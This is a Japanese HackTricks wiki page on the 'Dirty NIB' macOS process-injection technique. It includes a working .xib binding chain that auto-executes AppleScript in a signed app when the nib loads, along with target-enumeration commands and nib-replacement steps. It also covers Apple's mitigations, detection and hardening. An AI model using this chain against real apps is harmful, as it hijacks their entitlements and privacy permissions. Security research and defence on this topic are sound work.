# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB とは、署名済み macOS app bundle 内の Interface Builder ファイル（.xib/.nib）を悪用し、攻撃者が制御する logic を target process 内で実行する手法です。これにより、その process の entitlements と TCC permissions を継承できます。この technique は当初 xpn（MDSec）によって文書化され、その後 Sector7 によって一般化・大幅に拡張されました。Sector7 は macOS 13 Ventura および macOS 14 Sonoma における Apple の mitigations についても解説しています。<sup>[1][2]</sup> 背景情報と詳細については、末尾の references を参照してください。

> TL;DR
> • macOS 13 Ventura より前: bundle の MainMenu.nib（または startup 時に読み込まれる別の nib）を置き換えることで、process injection と、多くの場合 privilege escalation を確実に実現できました。
> • macOS 13（Ventura）以降、および macOS 14（Sonoma）での改善後: first-launch deep verification、bundle protection、Launch Constraints、新しい TCC の「App Management」permission により、無関係な app による post-launch nib tampering は大部分が防止されます。ただし、限定的なケース（例: 同じ developer の tooling による自分の app の変更、または user によって App Management/Full Disk Access を付与された terminals）では、依然として attack が可能な場合があります。


## NIB/XIB files とは

Nib（NeXT Interface Builder の略）files は、AppKit apps が使用する serialized UI object graphs です。現在の Xcode は編集可能な XML .xib files を保存し、build 時に .nib へ compile します。一般的な app は `NSApplicationMain()` を通じて main UI を読み込み、app の Info.plist にある `NSMainNibFile` key を読み取って、runtime に object graph を instantiate します。

この attack を可能にする主なポイント:
- NIB loading は、NSSecureCoding に準拠していない arbitrary Objective-C classes も instantiate します（`initWithCoder:` が利用できない場合、Apple の nib loader は `init`/`initWithFrame:` に fallback します）。
- Cocoa Bindings を悪用すると、nib の instantiate 時に methods を call できます。これには、user interaction を必要としない chained calls も含まれます。


## Dirty NIB injection process（attacker view）

classic な pre-Ventura flow:
1) malicious .xib を作成する
- `NSAppleScript` object（または `NSTask` などの別の「gadget」classes）を追加する。
- payload（例: AppleScript または command arguments）を title に含む `NSTextField` を追加する。
- bindings を介して target object の methods を call するように wired された `NSMenuItem` objects を 1 つ以上追加する。

2) user clicks なしで auto-trigger する
- bindings を使用して menu item の target/selector を設定し、private `_corePerformAction` method を invoke すると、nib の load 時に action が自動的に実行されます。これにより、user が button を click する必要がなくなります。

.xib 内の auto-trigger chain の最小例（分かりやすさのため一部省略）:
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
これは、nibのロード時に対象プロセスで任意のAppleScriptを実行可能にします。<sup>[1]</sup> 高度なチェーンでは、以下が可能です。
- 任意のAppKitクラス（例：`NSTask`）をインスタンス化し、`-launch`のような引数なしメソッドを呼び出す。
- 上記のbinding trickを使い、オブジェクト引数を伴う任意のselectorを呼び出す。
- AppleScriptObjC.frameworkをロードしてObjective-Cへbridgeし、選択したC APIまで呼び出す。
- Python.frameworkがまだ含まれている古いシステムでは、Pythonへbridgeした後、`ctypes`を使って任意のC関数を呼び出す（Sector7のresearch）。<sup>[2]</sup>

3) アプリのnibを置き換える
- target.appを書き込み可能な場所へコピーし、`Contents/Resources/MainMenu.nib`などをmalicious nibに置き換えて、target.appを実行する。Ventura以前では、初回のGatekeeper assessment後、以降の起動ではshallow signature checksのみが行われたため、`.nib`のような実行可能でないresourceは再検証されなかった。

可視テスト用のAppleScript payloadの例：
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)

Appleは、Modern macOSにおけるDirty NIBの実用性を大幅に低下させる、複数のsystemic mitigationsを導入しました。<sup>[2]</sup>
- First-launch deep verificationとbundle protection（macOS 13 Ventura）
- あらゆるアプリの初回起動時（quarantinedかどうかを問わず）、deep signature checkによってすべてのbundle resourcesが検証されます。その後、bundleは保護され、同じdeveloperのアプリ（またはアプリによって明示的に許可されたアプリ）だけがその内容を変更できます。他のアプリが別のアプリのbundleに書き込むには、新しいTCCの「App Management」permissionが必要です。
- Launch Constraints（macOS 13 Ventura）
- System/Apple-bundled appsは、別の場所にコピーして起動することができません。これにより、OS appsを「/tmpにコピーし、patchして実行する」アプローチは成立しなくなります。
- macOS 14 Sonomaにおける改善
- AppleはApp Managementを強化し、Sector7が指摘した既知のbypasses（例：CVE‑2023‑40450）を修正しました。Python.frameworkはそれ以前（macOS 12.3）に削除されており、一部のprivilege-escalation chainsが機能しなくなっています。
- Gatekeeper/Quarantine changes
- このtechniqueに影響を与えたGatekeeper、provenance、assessment changesについてのより広範な説明は、以下で参照されているページを確認してください。

> Practical implication
> • Ventura+では通常、プロセスにApp Managementが付与されているか、targetと同じTeam IDで署名されていない限り、third-party appの.nibを変更できません（例：developer tooling）。
> • shells/terminalsにApp ManagementまたはFull Disk Accessを付与すると、そのterminalのcontext内でcodeを実行できるあらゆるものに対して、このattack surfaceが実質的に再び開かれます。


### Addressing Launch Constraints

Launch Constraintsにより、Ventura以降、多くのApple appsをnon-default locationsから実行できなくなります。Apple appをtemporary directoryにコピーし、`MainMenu.nib`を変更して起動するなど、Ventura以前のworkflowに依存していた場合、>= 13.0では失敗すると考えてください。


## Enumerating targets and nibs (research / legacy systems向け)

- UIがnib-drivenのappsを特定する：
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- bundle 内の候補となる nib リソースを検索する：
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- コード署名を詳細に検証する（リソースを改ざんして再署名していない場合は失敗する）:
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> 注: modern macOSでは、適切な認証なしに他のアプリのbundleへ書き込もうとすると、bundle protection/TCCによってブロックされます。


## Detection and DFIR tips

- bundleリソースのFile integrity monitoring
- インストール済みアプリの`Contents/Resources/*.nib`や、その他のnon-executableリソースに対するmtime/ctimeの変更を監視します。
- Unified logsとprocess behavior
- GUIアプリ内で予期しないAppleScript executionが行われていないか、またAppleScriptObjCやPython.frameworkをloadしているprocessがないかを監視します。例:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proactive assessments
- 重要なアプリ全体に対して、定期的に`codesign --verify --deep`を実行し、リソースが完全な状態に保たれていることを確認します。
- Privilege context
- TCCの“App Management”またはFull Disk Accessを持つユーザーやprocessを監査します（特にterminalやmanagement agent）。これらをgeneral-purpose shellから削除すると、Dirty NIB-style tamperingの再有効化を簡単に行えなくなります。


## Defensive hardening (developers and defenders)

- programmatic UIを優先するか、nibからinstantiateされる対象を制限します。nib graphに強力なclass（例: `NSTask`）を含めないようにし、任意のobject上でselectorを間接的にinvokeするbindingも避けます。
- Library Validationを有効にしたhardened runtimeを採用します（modern appではすでに標準です）。これはnib injection自体を阻止するものではありませんが、native code loadingを容易に行えなくし、攻撃者をscripting-only payloadへ追い込みます。
- general-purpose toolで広範なApp Management permissionを要求したり、依存したりしないでください。MDMでApp Managementが必要な場合は、そのcontextをuser-driven shellから分離します。
- app bundleのintegrityを定期的に検証し、update mechanismがbundleリソースをself-healできるようにします。


## Related reading in HackTricks

このtechniqueに影響するGatekeeper、quarantine、provenance changesについて詳しく学べます。

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB (original write‑up with Pages example)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
